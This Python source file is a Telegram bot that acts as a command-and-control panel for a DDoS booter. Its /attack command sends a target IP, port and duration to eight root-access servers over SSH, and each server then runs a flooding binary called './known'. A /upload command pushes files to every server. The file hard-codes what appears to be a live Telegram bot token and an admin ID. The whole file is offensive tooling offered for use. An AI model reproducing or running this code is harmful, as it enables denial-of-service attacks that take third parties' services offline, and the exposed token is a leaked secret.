import asyncio
import datetime
import paramiko
from telegram import Update, InputFile
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext

TELEGRAM_BOT_TOKEN = '7110330439:AAGnXS6ZHG_SZ3_mfy2ycxMWRS3hT8uNsNQ'
ADMIN_USER_ID = 5142603617
USERS_FILE = 'users.txt'
LOG_FILE = 'log.txt'
attack_in_progress = False
users = set()
user_approval_expiry = {}

# Define VPS list
VPS_LIST = [
    {"ip": "VPS1_IP", "user": "root", "password": "VPS1_PASS"},
    {"ip": "VPS2_IP", "user": "root", "password": "VPS2_PASS"},
    {"ip": "VPS3_IP", "user": "root", "password": "VPS3_PASS"},
    {"ip": "VPS4_IP", "user": "root", "password": "VPS4_PASS"},
    {"ip": "VPS5_IP", "user": "root", "password": "VPS5_PASS"},
    {"ip": "VPS6_IP", "user": "root", "password": "VPS6_PASS"},
    {"ip": "VPS7_IP", "user": "root", "password": "VPS7_PASS"},
    {"ip": "VPS8_IP", "user": "root", "password": "VPS8_PASS"}
]

def ssh_command(vps, command):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(vps["ip"], username=vps["user"], password=vps["password"])
        stdin, stdout, stderr = client.exec_command(command)
        output = stdout.read().decode() + stderr.read().decode()
        client.close()
        return output
    except Exception as e:
        return f"Error: {str(e)}"

def upload_file(vps, file_path, remote_path):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(vps["ip"], username=vps["user"], password=vps["password"])
        sftp = client.open_sftp()
        sftp.put(file_path, remote_path)
        sftp.close()
        client.close()
        return f"File uploaded to {vps['ip']} successfully."
    except Exception as e:
        return f"Error uploading file to {vps['ip']}: {str(e)}"

async def upload(update: Update, context: CallbackContext):
    if update.effective_chat.id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Unauthorized access.*", parse_mode='Markdown')
        return
    
    if not context.args or len(context.args) != 1:
        await update.message.reply_text("Usage: /upload <filename>")
        return
    
    filename = context.args[0]
    remote_path = f"/root/{filename}"
    results = [upload_file(vps, filename, remote_path) for vps in VPS_LIST]
    await update.message.reply_text("\n".join(results))

async def help_command(update: Update, context: CallbackContext):
    commands = """Available Commands:
    /attack <ip> <port> <duration> - Launch an attack on all VPS
    /upload <filename> - Upload a file to all VPS
    /help - Show this help menu
    """
    await update.message.reply_text(commands)

async def attack(update: Update, context: CallbackContext):
    global attack_in_progress
    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    args = context.args

    if user_id not in users:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Unauthorized access.*", parse_mode='Markdown')
        return

    if attack_in_progress:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Attack already in progress.*", parse_mode='Markdown')
        return

    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
        return

    ip, port, duration = args
    try:
        duration = int(duration)
        if duration > 600:
            await context.bot.send_message(chat_id=chat_id, text="*⚠️ Max duration: 600s.*", parse_mode='Markdown')
            return
    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Duration must be a number.*", parse_mode='Markdown')
        return

    attack_in_progress = True
    command = f"./known {ip} {port} {duration} 800 "
    results = [ssh_command(vps, command) for vps in VPS_LIST]

    await context.bot.send_message(chat_id=chat_id, text="*⚔️ Attack launched on all VPS! ⚔️*", parse_mode='Markdown')
    attack_in_progress = False

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("upload", upload))
    application.add_handler(CommandHandler("help", help_command))
    application.run_polling()

if __name__ == '__main__':
    users = set()
    main()
